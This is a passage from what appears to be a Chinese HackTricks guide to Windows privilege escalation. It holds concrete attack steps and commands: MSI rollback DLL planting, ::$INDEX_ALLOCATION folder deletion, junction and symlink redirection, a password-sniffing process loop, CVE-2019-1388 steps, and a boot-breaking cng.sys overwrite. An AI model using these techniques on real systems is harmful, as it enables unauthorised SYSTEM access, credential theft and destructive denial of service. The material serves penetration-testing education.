Telephony 服务 (TapiSrv) 在 server 模式下会暴露 `\\pipe\\tapsrv` (MS-TRP)。远程已认证客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 转换为对 `NETWORK SERVICE` 可写的任意现有文件的任意 **4-byte write**，随后取得 Telephony 管理权限并以服务身份加载任意 DLL。完整流程：

- `ClientAttach` 将 `pszDomainUser` 设置为一个可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开该路径并将其用于异步事件写入。
- 每个事件都会将可被攻击者控制的 `InitContext`（来自 `Initialize`）写入该句柄。用 `LRegisterRequestRecipient`（`Req_Func 61`）注册一个 line app，触发 `TRequestMakeCall`（`Req_Func 121`），通过 `GetAsyncEvents`（`Req_Func 0`）获取，然后注销/关闭以重复确定性的写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后用任意 DLL 路径调用 `GetUIDllName` 以 `NETWORK SERVICE` 身份执行 `TSPI_providerUIIdentify`。

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 杂项

### File Extensions that could execute stuff in Windows

查看页面 **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

可点击的 Markdown 链接被转发到 `ShellExecuteExW`，可能触发危险的 URI 处理程序（`file:`、`ms-appinstaller:` 或任何已注册的 scheme），并以当前用户身份执行攻击者控制的文件。参见：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### 监控命令行中的密码

当以某个用户获得 shell 时，可能存在计划任务或其他正在执行的进程会**在命令行上传递凭据**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与上一次状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 从进程中窃取密码

## 从低权限用户升级到 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC 绕过

如果你可以访问图形界面（通过 console 或 RDP），并且 UAC 已启用，那么在某些 Microsoft Windows 版本中，可以从非特权用户运行一个 terminal 或任何其他进程，例如 "NT\AUTHORITY SYSTEM"。

这使得能够利用同一漏洞同时提升权限并绕过 UAC。此外，无需安装任何东西，过程中使用的二进制文件是由 Microsoft 签名和发布的。

部分受影响的系统包括：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## 从 Administrator 的 Medium 完整性级别 到 High 完整性级别 / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 从任意文件夹删除/移动/重命名 到 SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

该攻击基本上是滥用 Windows Installer 的 rollback 功能，在卸载过程中将合法文件替换为恶意文件。为此，攻击者需要创建一个**恶意 MSI 安装包**，用于劫持 `C:\Config.Msi` 文件夹，Windows Installer 在卸载其他 MSI 包时会将回滚文件存放到该文件夹，而这些回滚文件会被修改为包含恶意负载。

该技术总结如下：

1. **阶段 1 – 为劫持做准备（使 `C:\Config.Msi` 为空）**

- Step 1: Install the MSI
- 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装一个无害文件（例如 `dummy.txt`）。
- 将安装程序标记为 **"UAC Compliant"**，以便**非管理员用户**可以运行它。
- 在安装后**保持对该文件的句柄打开**。

- Step 2: Begin Uninstall
- 卸载相同的 `.msi`。
- 卸载过程开始将文件移动到 `C:\Config.Msi` 并将其重命名为 `.rbf` 文件（回滚备份）。
- **轮询打开的文件句柄**，使用 `GetFinalPathNameByHandle` 检测何时该文件变为 `C:\Config.Msi\<random>.rbf`。

- Step 3: Custom Syncing
- `.msi` 包含一个**自定义卸载动作（`SyncOnRbfWritten`）**，该动作：
- 在 `.rbf` 被写入时发出信号。
- 然后在继续卸载之前**等待**另一个事件。

- Step 4: Block Deletion of `.rbf`
- 在收到信号时，**以不带 `FILE_SHARE_DELETE` 的方式打开 `.rbf` 文件**——这会**阻止其被删除**。
- 然后**回传信号**以便卸载继续。
- Windows Installer 无法删除该 `.rbf`，且因为无法删除所有内容，**`C:\Config.Msi` 不会被移除**。

- Step 5: Manually Delete `.rbf`
- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 为空**，可以被劫持。

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **阶段 2 – 用恶意回滚脚本替换回滚脚本**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自行重新创建 `C:\Config.Msi` 文件夹。
- 设置**弱 DACLs**（例如 Everyone:F），并**保持一个带有 `WRITE_DAC` 的句柄打开**。

- Step 7: Run Another Install
- 再次安装该 `.msi`，设置：
- `TARGETDIR`：可写位置。
- `ERROROUT`：触发强制失败的变量。
- 这个安装将用于再次触发**回滚**，回滚会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监视 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- `.msi` 包含一个**自定义安装动作（`SyncBeforeRollback`）**，该动作：
- 在 `.rbs` 创建时发出事件信号。
- 然后在继续之前**等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会**重新应用强 ACL** 到 `C:\Config.Msi`。
- 但由于你仍然持有一个带有 `WRITE_DAC` 的句柄，你可以再次**重新应用弱 ACL**。

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- 覆盖 `.rbs` 文件为一个**伪回滚脚本**，该脚本指示 Windows：
- 将你的 `.rbf` 文件（恶意 DLL）恢复到一个**有权限的位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 丢弃包含**恶意 SYSTEM 级负载 DLL** 的伪 `.rbf`。

- Step 12: Trigger the Rollback
- 发出同步事件使安装程序继续。
- 一个**type 19 自定义动作（`ErrorOut`）**被配置为在已知点**故意使安装失败**。
- 这会触发**回滚开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你的**恶意 DLL 位于 SYSTEM 加载路径**中。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的**auto-elevated binary**（例如 `osk.exe`），它会加载你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此流存储文件夹的 **索引元数据**。

因此，如果你 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS **会从文件系统中移除整个文件夹**。

你可以使用标准文件删除 API 来做到这一点，例如：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *文件* 删除 API，它 **删除了文件夹本身**。

### 从 Folder Contents Delete 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但它**确实允许删除攻击者控制的文件夹的*内容***?

1. 步骤 1：设置诱饵文件夹和文件
- 创建: `C:\temp\folder1`
- 在其中: `C:\temp\folder1\file1.txt`

2. 步骤 2：在 `file1.txt` 上放置一个 **oplock**
- 当有特权进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 步骤 3：触发 SYSTEM 进程（例如，`SilentCleanup`）
- 该进程会扫描文件夹（例如，`%TEMP%`）并尝试删除其中的内容。
- 当它遇到 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 步骤 4：在 oplock 回调内 – 重定向删除操作

- 选项 A：将 `file1.txt` 移动到其他位置
- 这会在不破坏 oplock 的情况下清空 `folder1`。
- 不要直接删除 `file1.txt` —— 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换成 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C：在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS 内部流 — 删除它会删除该文件夹。

5. 第5步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从任意文件夹创建到永久 DoS

利用一个原语，使你能够 **create an arbitrary folder as SYSTEM/admin** — 即使 **you can’t write files** 或 **set weak permissions**。

创建一个 **文件夹**（不是文件）其名称为 **关键 Windows 驱动程序**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应 `cng.sys` 内核模式驱动程序。
- 如果你 **事先将其创建为文件夹**，Windows 在启动时无法加载实际驱动程序。
- 然后，Windows 在启动期间尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际驱动程序**，并**崩溃或停止启动**。
- **没有回退机制**，且**在没有外部干预（例如启动修复或磁盘访问）的情况下无法恢复**。

### 从特权日志/备份路径 + OM symlinks 到任意文件覆盖 / 启动 DoS

当一个 **privileged service** 将日志/导出写入从 **writable config** 读取的路径时，可以使用 **Object Manager symlinks + NTFS mount points** 重定向该路径，将特权写入变成任意覆盖（即使 **没有** SeCreateSymbolicLinkPrivilege）。

**Requirements**
- 存储目标路径的配置对攻击者可写（例如 `%ProgramData%\...\.ini`）。
- 能够创建到 `\RPC Control` 的 mount point 和一个 OM 文件符号链接（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- 有一个会向该路径写入的特权操作（日志、导出、报告）。

**Example chain**
1. 读取配置以恢复特权日志目标，例如 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` 在 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中。
2. 在无管理员权限的情况下重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，管理员触发 "send test SMS"）。写入现在落在 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（十六进制/PE 解析器）以确认损坏；重启会强制 Windows 加载被篡改的驱动程序路径 → 启动循环 DoS。 这也可以推广到任何特权服务会以写入方式打开的受保护文件。

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **From High Integrity to System**

### **New service**

如果你已经在 High Integrity 进程上运行，通往 **SYSTEM** 的路径可以很简单，只需 **创建并执行一个新服务**：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者该二进制能尽快执行必要的操作——否则如果它不是有效的 service，会在 20s 内被终止。

### AlwaysInstallElevated

从 High Integrity 进程你可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用 _**.msi**_ 包装器 **安装** 一个 reverse shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**在这里找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 权限（通常会在已处于 High Integrity 的进程中发现），你将能够使用 SeDebug 权限 **打开几乎任何进程**（非受保护进程）、**复制该进程的 token**，并使用该 token **创建任意进程**。\
使用此技术通常会**选择一个以 SYSTEM 身份运行且具有全部 token 权限的进程**（是的，你可以找到没有全部 token 权限的 SYSTEM 进程）。\
**你可以在此处找到** [**执行所提技术的示例代码**](sedebug-+-seimpersonate-copy-token.md)**。**

### Named Pipes

该技术被 meterpreter 用于 getsystem 提权。该技术的流程是 **创建一个 pipe，然后创建/滥用一个 service 向该 pipe 写入**。随后，创建该 pipe 的 **server**（具有 `SeImpersonate` 权限）将能够 **impersonate pipe client（即 service）的 token**，从而获得 SYSTEM 权限。\
如果你想要 [**了解更多关于 Named Pipes 的内容请阅读此处**](#named-pipe-client-impersonation)。\
如果你想阅读一个从 high integrity 到 System 使用 Named Pipes 的示例，请阅读此处：[**from-high-integrity-to-system-with-name-pipes.md**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你能够 **劫持一个被以 SYSTEM 身份运行的进程加载的 dll**，你就能以该权限执行任意代码。因此 Dll Hijacking 对此类提权也很有用，而且从 high integrity 进程更**容易实现**，因为它通常对用于加载 dll 的文件夹有**写权限**。\
**你可以** [**在这里了解更多关于 Dll hijacking 的信息**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**阅读：** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**用于查找 Windows 本地特权提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件（**[**查看此处**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息（**[**查看此处**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 的已保存会话信息。本地使用时加上 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭据。已检测到。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域内对收集到的密码进行密码喷洒**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS 欺骗与中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 Windows 提权枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~-- 搜索已知的提权漏洞（已弃用，改用 Watson）~~**\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要 Admin 权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的提权漏洞（需要使用 VisualStudio 编译）（[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更偏向信息收集而非提权）（需要编译）**（**[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭据（GitHub 上有预编译的 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- 将 PowerUp 移植到 C# 的版本**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~-- 检查错误配置（GitHub 上有预编译可执行文件）。不推荐。 在 Win10 上效果不佳。~~**\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（Python 转 exe）。不推荐。在 Win10 上效果不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于此帖创建的工具（不需要 accesschk 即可正常工作，但也可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的漏洞利用（本地 Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的漏洞利用（本地 Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确版本的 .NET 编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
